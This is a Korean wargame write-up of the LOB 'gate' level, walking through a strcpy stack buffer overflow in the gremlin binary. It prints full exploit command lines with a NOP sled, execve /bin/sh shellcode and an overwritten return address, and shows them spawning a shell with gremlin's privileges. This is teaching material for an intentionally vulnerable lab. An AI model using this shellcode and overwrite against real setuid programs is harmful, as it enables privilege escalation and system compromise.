# LOB - Gate

## 주어진 파일

![1567941739468](C:%5CUsers%5CJaewan.DESKTOP-TRD27GL%5CDesktop%5CLOB%5CLOB%5CLOB%20-%20Gate.assets%5C1567941739468-1568525084718.png)



ID : gate

PW : gate로 접속한다.



![1567941702228](C:%5CUsers%5CJaewan.DESKTOP-TRD27GL%5CDesktop%5CLOB%5CLOB%5CLOB%20-%20Gate.assets%5C1567941702228.png)

```c
vi gremlin.c
```

![1567930461328](C:%5CUsers%5CJaewan.DESKTOP-TRD27GL%5CDesktop%5CLOB%5CLOB%5CLOB%20-%20Gate.assets%5C1567930461328.png)



위의 프로그램은 ./실행파일, 인자

를 넣어서 실행하는 파일로, 인자를 넣지 않는다면 error

인자를 넣는다면 인자를 그대로 출력해 주는 프로그램이다.

하지만, strcpy를 통해 buffer의 크기인 256을 넘어가면 문제가 생기게 된다.



## GDB

처음 gdb로 확인하려면 자신의 권한으로 까야하기 때문에 main 페이지에 있던 gremlin 파일을 디렉터리를 새로 만들어서 복사한다.

```mkdir
mkdir tmp
cp gremlin tmp/
```

![1567941473987](C:%5CUsers%5CJaewan.DESKTOP-TRD27GL%5CDesktop%5CLOB%5CLOB%5CLOB%20-%20Gate.assets%5C1567941473987.png)



복사를 하고 나면 소유자와 그룹이 gremlin 이었던 파일이 자신의 이름인 gate와 gate로 바뀐 것을 볼 수 있다.

이제 gdb를 실행할 수 있다.



```c
gdb gremlin
```

![1567931017425](C:%5CUsers%5CJaewan.DESKTOP-TRD27GL%5CDesktop%5CLOB%5CLOB%5CLOB%20-%20Gate.assets%5C1567931017425.png)



gdb로 main문을 보면 sub 0x100으로 버퍼 크기인 256 바이트가 보인다.



![1567930817522](C:%5CUsers%5CJaewan.DESKTOP-TRD27GL%5CDesktop%5CLOB%5CLOB%5CLOB%20-%20Gate.assets%5C1567930817522.png)

위의 프로그램은 버퍼에 256 byte, SFP에 4 byte, RET에 4 byte 가 들어가서 



SFP :   Saved Frame Pointer로 프레임 포인터 값을 가지는 공간으로서 만약 main에서 다른 함수를 호출했을때, 돌아올 주소를 저장하는 공간이다.

-> EBP



RET은 Retrun Address 로써 프로그램이 마치면 돌아갈 주소를 저장하는 공간으로 bof의 궁극적 목적 공간이다.

이 ret을 조작하여 다른 곳으로 돌아가게 할 수 있으며, SetUID가 걸렸을 경우 쉘로 조작하여 상위 권한의 수을 얻을 수 있다.



RET은 우리가 실행해야할 주소가 들어가야하므로

Buffer 부분에 쉘코드를 집어 넣은 후 SFP까지 0x90으로 Nop 값을 채워주면 된다.

Buffer 는 256 byte

SFP 는 4 byte 이므로 260 byte를 채우고,

RET 에 내가 점프하고 싶은 부분의 주소를 넣으면 된다.



```c
buffer의 크기는 256 byte
SFP의 크기는 4 byte 
이므로 둘을 더한 260 byte (= 0x104)
    
./gremlin `python -c 'print "a"*0x104'`
를 실행하면 segmentation fault 가 뜬다.
```





## 쉘코드

- https://security-nanglam.tistory.com/117 에서 쉘코드 가져옴

![1567941320888](C:\Users\Jaewan.DESKTOP-TRD27GL\AppData\Roaming\Typora\typora-user-images\1567941320888.png)

```c
\x90으로 215 바이트
쉘코드 25 바이트
\x90 20바이트	를 채워서 Buffer + SFP 의 크기인 260 바이트를 채워주고
마지막에 RET 값을 넣는다.

./gremlin `python -c 'print "\x90"*215+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x90"*20+"내가 점프하고 싶은 부분의 주소"'`
```

- 첫 부분에 쉘코드를 넣으면 정확한 주소 값을 알고 난 후 공격해야하므로 
- Nop으로 앞부분을 채워준 후 쉘코드 + Nop + RET 값을 넣는다.
- 하지만 쉘코드와 RET 주소 값을 가장 뒤에 같이 두면 쉘코드 뒤에 따라 나오는 값이 있을 수 있으므로

- 쉘코드 뒤에 어느 정도 Nop을 넣어준 후 마지막에 점프하고 싶은 부분의 주소(RET)를 넣어줘야한다.





일단 RET 부분에 aaaa를 넣고 aaaa가 어디에 들어가는지 보았다.

```c
./gremlin `python -c 'print "\x90"*215+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x90"*20+"\x61\x61\x61\x61"'`
```



```c
gdb gremlin 명령어를 통해 gdb를 열고 위의 POC를 적는다.
```

![1567939292222](C:%5CUsers%5CJaewan.DESKTOP-TRD27GL%5CDesktop%5CLOB%5CLOB%5CLOB%20-%20Gate.assets%5C1567939292222.png)



0x61616161 주소가 뭐냐고 묻는다.



- RET에 0x61616161이 들어갔으므로 eip에 들어간다.

![1567939240330](C:%5CUsers%5CJaewan.DESKTOP-TRD27GL%5CDesktop%5CLOB%5CLOB%5CLOB%20-%20Gate.assets%5C1567939240330.png)



```c
x/100wx $esp+300 명령어로 어떻게 값이 들어갔는지 보면
```

![1567939933686](C:%5CUsers%5CJaewan.DESKTOP-TRD27GL%5CDesktop%5CLOB%5CLOB%5CLOB%20-%20Gate.assets%5C1567939933686.png)

위와 같이 Nop으로 값이 채워지고, 중간에 쉘코드, Nop, RET 값이 들어가는 것을 볼 수 있다.

이제 맨 마지막 0x61616161 자리에 Nop이 있는 주소 중 아무거나 넣어주면 된다.

하지만 tmp 디렉터리 내에서 실행하면 gremlin 파일이 gate 권한을 가지고 있으므로, main으로 돌아가서 실행한다.

![1567942068037](C:%5CUsers%5CJaewan.DESKTOP-TRD27GL%5CDesktop%5CLOB%5CLOB%5CLOB%20-%20Gate.assets%5C1567942068037.png)

```c
./gremlin `python -c 'print "\x90"*215+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x90"*20+"\xdc\xfb\xff\xbf"'`
```





### 위의 명령어로 되지 않을때

하지만 gdb를 실행할때마다 주소값이 차이가 조금씩 나기 때문에,

위의 명령어로 되지 않을 수도 있다.

그래서 core 파일을 확인해본다.



- segmentation fault 날 때 core dumped 를 통해 나오는 core 파일을 확인한다.

![1567940758653](C:%5CUsers%5CJaewan.DESKTOP-TRD27GL%5CDesktop%5CLOB%5CLOB%5CLOB%20-%20Gate.assets%5C1567940758653.png)

위와 같이 core dumped가 나오면



다음과 같이 core 파일이 생긴다.

![1567941218417](C:%5CUsers%5CJaewan.DESKTOP-TRD27GL%5CDesktop%5CLOB%5CLOB%5CLOB%20-%20Gate.assets%5C1567941218417.png)



```c
gdb -c core 명령어를 통해 들어간 후
```

![1567940878365](C:%5CUsers%5CJaewan.DESKTOP-TRD27GL%5CDesktop%5CLOB%5CLOB%5CLOB%20-%20Gate.assets%5C1567940878365.png)



```c
x/100wx $esp+300 값을 통해 값이 어디에 들어갔는지 확인해본다.
```

![1567941114068](C:%5CUsers%5CJaewan.DESKTOP-TRD27GL%5CDesktop%5CLOB%5CLOB%5CLOB%20-%20Gate.assets%5C1567941114068.png)



이 중 Nop 값 중 하나를 선택해서 RET에 넣으면 된다.

하지만 tmp 디렉터리 내에서 실행하면 gremlin 파일이 gate 권한을 가지고 있으므로, main으로 돌아가서 실행한다.

![1567942068037](C:%5CUsers%5CJaewan.DESKTOP-TRD27GL%5CDesktop%5CLOB%5CLOB%5CLOB%20-%20Gate.assets%5C1567942068037-1568525258114.png)



```c
./gremlin `python -c 'print "\x90"*215+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x90"*20+"\xcc\xfb\xff\xbf"'`
```

![1567941814846](C:%5CUsers%5CJaewan.DESKTOP-TRD27GL%5CDesktop%5CLOB%5CLOB%5CLOB%20-%20Gate.assets%5C1567941814846.png)

쉘이 뜬다.



![1567941853794](C:%5CUsers%5CJaewan.DESKTOP-TRD27GL%5CDesktop%5CLOB%5CLOB%5CLOB%20-%20Gate.assets%5C1567941853794.png)

ID를 보면 gremlin이 있다.

my-pass 를 보면 gremlin의 password가 나온다.